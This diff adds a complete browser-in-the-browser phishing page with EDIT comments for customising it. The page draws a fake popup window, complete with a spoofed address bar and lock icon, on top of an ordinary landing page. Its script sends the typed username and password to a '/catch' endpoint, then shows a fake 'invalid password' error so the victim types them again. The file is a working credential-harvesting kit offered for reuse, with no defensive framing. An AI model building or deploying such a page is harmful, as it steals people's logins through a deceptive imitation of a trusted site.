@@ -1,0 +1,64 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8">
+<!-- EDIT: change this title -->
+<title>My Custom Page</title>
+<style>*{box-sizing:border-box;margin:0;padding:0}
+/* EDIT: change body background */
+body{font-family:Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;}
+.hero{text-align:center;padding:40px}
+/* EDIT: change landing page text colour */
+.hero h1{font-size:2em;color:#333;margin-bottom:10px}
+.hero p{color:#666;margin-bottom:24px}
+.btn{padding:12px 32px;background:#007bff;color:white;border:none;border-radius:4px;font-size:1em;cursor:pointer}
+#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:9999;align-items:center;justify-content:center}
+#ov.show{display:flex}
+.bw{width:440px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5);animation:popIn .15s ease-out}
+@keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
+.tb{background:#dee1e6;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
+.dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
+.dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
+.ub{flex:1;background:white;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#333}
+.lock{color:#1a73e8;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#666}
+.bd{background:white;padding:32px 36px 28px}
+/* EDIT: popup heading colour */
+.bd h2{text-align:center;font-size:18px;color:#333;margin-bottom:6px}
+.bd .sub{text-align:center;font-size:13px;color:#666;margin-bottom:22px}
+.bd label{font-size:13px;color:#333;display:block;margin-bottom:4px}
+.bd input{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:14px;outline:none;box-sizing:border-box}
+/* EDIT: submit button colour */
+.bd .bs{width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;font-size:15px;cursor:pointer}
+.bd .err{display:none;color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:10px}
+</style></head><body>
+<!-- EDIT: landing page content -->
+<div class="hero">
+  <h1>My Custom Page</h1>
+  <p>Your subtitle here</p>
+  <button class="btn" onclick="showB()">Login</button>
+</div>
+<div id="ov"><div class="bw">
+<div class="tb">
+<div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
+<!-- EDIT: fake address bar URL -->
+<div class="ub"><span class="lock">&#128274;</span><span><strong>example.com</strong><span style="color:#888">/login</span></span></div>
+<button class="xbtn" onclick="hideB()">&#x2715;</button></div>
+<div class="bd">
+  <!-- EDIT: popup heading and subtitle -->
+  <h2>Sign in</h2><p class="sub">Your subtitle here</p>
+  <form id="lf" onsubmit="doSub(event)">
+    <!-- EDIT: field labels and placeholders -->
+    <label>Username</label><input type="text" id="fu" placeholder="Enter username" required>
+    <label>Password</label><input type="password" id="fp" placeholder="Enter password" required>
+    <!-- EDIT: error message shown after fake failed login -->
+    <p class="err" id="em">Invalid username or password.</p>
+    <button class="bs" type="submit">Sign in</button>
+  </form>
+</div></div></div>
+<script>
+function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fu').focus(),150);}
+function hideB(){document.getElementById('ov').classList.remove('show');}
+document.getElementById('ov').addEventListener('click',function(e){if(e.target===this)hideB();});
+function doSub(e){e.preventDefault();
+var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
+fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
+var b=e.target.querySelector('.bs');b.textContent='Signing in…';b.disabled=true;
+setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Sign in';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
+</script></body></html>
